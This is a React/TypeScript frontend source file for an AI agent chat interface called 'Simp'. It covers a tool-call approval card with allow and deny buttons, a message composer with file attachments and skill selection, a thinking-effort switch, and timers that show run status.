  const card = useRef<HTMLDivElement>(null);
  useEffect(() => {
    const a = document.activeElement;
    if (!(a instanceof HTMLTextAreaElement || a instanceof HTMLInputElement)) card.current?.focus({ preventScroll: true });
  }, [p.call_id]);
  return (
    <div ref={card} tabIndex={-1} className="approval-card" role="alertdialog" aria-label="Approval needed">
      {(() => {
        const ask = approvalAsk(p.tool, p.args);
        return <>
          <p className="ask">{ask.question}</p>
          {ask.code !== undefined && <pre className="args">{ask.code}</pre>}
          {ask.lines.length > 0 && <ul className="args-list">{ask.lines.map((l, i) => <li key={i}>{l}</li>)}</ul>}
        </>;
      })()}
      <div className="row">
        <button className="primary" onClick={() => answer("allow")}>Allow</button>
        <button onClick={() => answer("always")}>Always allow {mcpLabel(p.tool)?.split(" · ")[0] ?? p.tool}</button>
        <button className="danger" onClick={() => answer("deny")}>Deny</button>
      </div>
    </div>
  );
}

export function Composer({ busy, send, variant, disabled, tools, sid, onError, onQueueFiles, idle = false, prefill }: {
  busy: boolean; send: Send; variant?: "hero"; disabled?: boolean; tools?: ReactNode;
  /** With a session: show the attach button; files go to the workspace root (same as the Files panel). */
  sid?: string; onError?: (e: unknown) => void;
  /** No session yet (home): keep picked files; the caller uploads them once the session exists. */
  onQueueFiles?: (files: File[]) => void;
  /** Let Simp come out and play on the box when the chat sits idle (chat view only). */
  idle?: boolean;
  /** Put this text in the box to edit before sending (a suggestion was picked); n changes on every pick. */
  prefill?: { text: string; n: number };
}) {
  const [text, setText] = useState("");
  useEffect(() => {
    if (!prefill) return;
    setText(prefill.text);
    requestAnimationFrame(() => { const el = area.current; if (el) { el.focus(); el.setSelectionRange(el.value.length, el.value.length); } });
  }, [prefill?.n]);
  // files picked or pasted wait here (removable) and are uploaded when the message is sent
  const [pending, setPending] = useState<File[]>([]);
  const [uploading, setUploading] = useState(false);
  // skills the user picked (menu or "/name "): their instructions go with the next prompt
  const [skills, setSkills] = useState<SkillItem[] | null>(null);
  const [picked, setPicked] = useState<string[]>([]);
  const [menu, setMenu] = useState<boolean | "skills">(false);
  // how hard the model thinks on the next run (remembered in this browser); "low" by default
  const [effort] = useEffort();
  useEffect(() => { api.skills().then((s) => setSkills(s.filter((x) => x.enabled)), () => setSkills([])); }, []);
  const pick = (name: string) => { setPicked((p) => p.includes(name) ? p : [...p, name]); setMenu(false); area.current?.focus(); };
  const label = (name: string) => skills?.find((s) => s.name === name)?.label ?? name;
  const area = useRef<HTMLTextAreaElement>(null);
  const picker = useRef<HTMLInputElement>(null);
  useEffect(() => { setPending([]); setPicked([]); }, [sid]);
  useLayoutEffect(() => {  // grow with the text; CSS max-height caps it and the rest scrolls
    const el = area.current;
    if (!el) return;
    el.style.height = "auto";
    el.style.height = `${el.scrollHeight}px`;
  }, [text]);
  const empty = !text.trim() && !pending.length;  // files alone can be sent, with no text
  const submit = async () => {
    const t = text.trim();
    if ((!t && !pending.length) || disabled || uploading) return;
    const names = pending.map((f) => f.name);
    if (pending.length) {
      if (!sid) onQueueFiles?.(pending);  // home: the caller uploads them once the session exists
      else {
        setUploading(true);
        try { for (const f of pending) await api.upload(sid, f.name, f); }
        catch (e) { onError?.(e); setUploading(false); return; }  // keep the files and the text: nothing was sent
        setUploading(false);
      }
    }
    const files = `[Attached files in the workspace: ${names.join(", ")}]`;  // so the agent knows
    const note = !names.length ? "" : t ? `\n\n${files}` : files;
    // pictures go with a new prompt for the model to look at (a message sent while busy only names them)
    const images = names.filter((n) => /\.(png|jpe?g|webp|gif)$/i.test(n)).slice(0, 6);
    send(!busy ? { type: "prompt", text: t + note, images, skills: picked, effort } : { type: "steer", text: t + note });
    setText("");
    setPending([]);
    if (!busy) setPicked([]);  // a steer can't carry skills: keep the picks for the next prompt
  };
  const stop = () => send({ type: "abort" });
  const add = (files: FileList | File[] | null) => {
    const list = [...(files ?? [])];  // copy now: clearing the picker below empties its live FileList
    if (list.length) setPending((p) => [...p.filter((x) => !list.some((f) => f.name === x.name)), ...list]);
    if (picker.current) picker.current.value = "";
  };
  const canAttach = !!(sid || onQueueFiles);
  useEffect(() => {  // a click outside the box closes the + menu
    if (!menu) return;
    const off = (e: PointerEvent) => { if (!(e.target as Element).closest?.(".composer-card")) setMenu(false); };
    document.addEventListener("pointerdown", off);
    return () => document.removeEventListener("pointerdown", off);
  }, [menu]);
  const plus = (
    <button type="button" className="round attach" aria-label="Attach files or use a skill" title="Attach files or use a skill"
      aria-expanded={!!menu} disabled={uploading} onClick={() => setMenu((v) => !v)}><IconPlus size={16} /></button>
  );
  return (
    <div className={`composer ${variant ?? ""}`}>
      {idle && <IdleSimp enabled={!busy && !disabled} />}
      <div className="composer-card expanded"
        onClick={(e) => { if (e.target === e.currentTarget) area.current?.focus(); }}>
        {menu && (
          <div className="plus-menu" role="menu" aria-label="Add to the message">
            {menu === "skills" ? <>
              <button type="button" className="menu-back" onClick={() => setMenu(true)}><IconChevron size={14} /> Skills</button>
              {skills?.map((s) => (
                <button key={s.name} type="button" role="menuitem" aria-pressed={picked.includes(s.name)} onClick={() => pick(s.name)}>
                  {s.label} <span className="muted">/{s.name}</span></button>
              ))}
            </> : <>
              {canAttach && <button type="button" role="menuitem" onClick={() => { setMenu(false); picker.current?.click(); }}>
                <IconFile size={16} /> Attach files</button>}
              {skills && skills.length > 0 && <button type="button" role="menuitem" onClick={() => setMenu("skills")}>
                <IconWand size={16} /> Use a skill <IconChevron size={14} className="end" /></button>}
            </>}
          </div>
        )}
        {picked.length > 0 && (
          <ul className="attached chips" aria-label="Used with this message" aria-live="polite">
            {picked.map((n) => (
              <li key={n} className="skill-chip"><IconWand size={12} /> {label(n)}
                <button type="button" aria-label={`Remove skill ${label(n)}`} onClick={() => setPicked((p) => p.filter((x) => x !== n))}><IconClose size={12} /></button>
              </li>
            ))}
          </ul>
        )}
        {pending.length > 0 && (
          <ul className="attached" aria-label="Files to send" aria-live="polite">
            {pending.map((f) => <PendingFile key={f.name} file={f} disabled={uploading} onRemove={() => setPending((p) => p.filter((x) => x !== f))} />)}
            {uploading && <li className="muted">Uploading…</li>}
          </ul>
        )}
        <textarea
          ref={area} value={text} rows={1} autoFocus aria-label="Message" disabled={disabled}
          placeholder={busy ? "Add to what Simp is doing…" : "Message Simp…"}
          onChange={(e) => {  // "/pptx " at the start picks that skill and drops the command from the text
            const v = e.target.value, m = /^\/([\w.-]+)\s/.exec(v);
            const s = m && skills?.find((x) => x.name === m[1].toLowerCase());
            if (s) { pick(s.name); setText(v.slice(m![0].length)); } else setText(v);
          }}
          onPaste={(e) => {  // a pasted picture waits with the attached files (named by time: screenshots are all "image.png")
            const imgs = pastedImages(e);
            if (!imgs.length || !canAttach) return;
            e.preventDefault();
            add(imgs);
          }}
          onKeyDown={(e) => {
            if (e.key === "Escape" && menu) { setMenu(false); return; }
            if (e.key === "Enter" && !e.shiftKey && !e.nativeEvent.isComposing) { e.preventDefault(); submit(); }
            if (e.key === "Escape" && busy) stop();
          }}
        />
        {canAttach && <input ref={picker} type="file" multiple hidden onChange={(e) => add(e.target.files)} />}
        <div className="composer-bar">
          {plus}
          <span className="spacer" />
          {tools || <ModelPicker value="" options={[]} labels={{}} onChange={() => {}} effort />}
          {busy && empty ? (
            <button type="button" className="round stop" aria-label="Stop" title="Stop (Esc)" onClick={stop}><IconStop size={16} /></button>
          ) : (
            <button type="button" className="round send" aria-label={busy ? "Steer" : "Send"}
              title={busy ? "Steer" : "Send"} disabled={empty || disabled} onClick={submit}>
              <IconArrowUp size={16} />
            </button>
          )}
        </div>
      </div>
    </div>
  );
}


/** "20s", "1m 20s", "1h 2m": compact elapsed time. */
export type Effort = "low" | "medium" | "high";
function savedEffort(): Effort {
  try { const v = localStorage.getItem("simp.effort"); return v === "medium" || v === "high" ? v : "low"; } catch { return "low"; }
}
// how hard the model thinks on the next run: one value shared by the composer and the model picker, remembered in this browser
let effortNow: Effort = savedEffort();
const effortSubs = new Set<(e: Effort) => void>();
export function useEffort(): [Effort, (e: Effort) => void] {
  const [e, setE] = useState(effortNow);
  useEffect(() => { effortSubs.add(setE); return () => { effortSubs.delete(setE); }; }, []);
  return [e, (v) => { effortNow = v; try { localStorage.setItem("simp.effort", v); } catch { /* private mode */ } effortSubs.forEach((f) => f(v)); }];
}
export const EFFORT_LABEL = { low: "Quick", medium: "Careful", high: "Deep" } as const;
/** The thinking switch shown under the models in the model picker. */
export function EffortSwitch() {
  const [effort, setEffort] = useEffort();
  return (
    <div className="think-box">
      <div className="think-head" id="think-head">Thinking</div>
      <div className="think" role="group" aria-labelledby="think-head">
        {(["low", "medium", "high"] as const).map((v) => (
          <button key={v} type="button" aria-pressed={effort === v} onClick={() => setEffort(v)}>{EFFORT_LABEL[v]}</button>
        ))}
      </div>
    </div>
  );
}

export function fmtDuration(ms: number): string {
  const t = Math.max(0, Math.floor(ms / 1000)), h = Math.floor(t / 3600), m = Math.floor((t % 3600) / 60), sec = t % 60;
  return h ? `${h}h ${m}m` : m ? `${m}m ${sec}s` : `${sec}s`;
}

/** Re-render every second while `on`, and return Date.now(). */
function useNow(on: boolean): number {
  const [, tick] = useState(0);
  useEffect(() => {
    if (!on) return;
    const t = setInterval(() => tick((n) => n + 1), 1000);
    return () => clearInterval(t);
  }, [on]);
  return Date.now();
}

// When each tool call was first seen running and when its result arrived (client clock; survives re-renders).
const toolTimes = new Map<string, { start: number; end?: number }>();
/** Elapsed ms for a tool call: live while running, frozen when done; null if it was already done when first seen. */
function useToolTimer(id: string, running: boolean): number | null {
  const now = useNow(running);
  let t = toolTimes.get(id);
  if (!t) { t = running ? { start: now } : { start: now, end: now }; toolTimes.set(id, t); if (!running) return null; }
  if (!running && t.end === undefined) t.end = now;
  if (t.end !== undefined && t.end === t.start) return null;
  return (t.end ?? now) - t.start;
}

// Simp's made-up working words: one is picked at random when a run starts and kept for that run.
const SIMP_WORDS = ["Simping", "Mumbling", "Bumbling", "Noodling", "Pondering", "Fiddling", "Tinkering", "Puttering",
  "Whirring", "Scribbling", "Doodling", "Wobbling", "Murmuring", "Rummaging", "Simmering", "Bonking"];
const runStarts = new Map<string, { start: number; word: string }>();  // one random word per run
/** "Simping… 1m 20s" under the conversation for the whole run: counted from when the server started it (so leaving
 * and coming back keeps counting); before the server says, from when the run was first seen here. */
function RunStatus({ sid, asking = false, started }: { sid: string; asking?: boolean; started?: number | null }) {
  const now = useNow(true);
  useEffect(() => () => { runStarts.delete(sid); }, [sid]);
  if (!runStarts.has(sid)) runStarts.set(sid, { start: now, word: SIMP_WORDS[Math.floor(Math.random() * SIMP_WORDS.length)] });
  const { start, word } = runStarts.get(sid)!;
  const ms = now - (started ?? start);
  return (
    <div className="msg assistant typing run-status" role="status" aria-label={`Simp is working, ${fmtDuration(ms)}`}>
      <Mascot3D size={32} pixels={48} working={!asking} mood={asking ? "asking" : "idle"} /><span className="run-word">{asking ? "Waiting for you" : `${word}…`}</span><span className="run-time">{fmtDuration(ms)}</span>
    </div>
  );
}
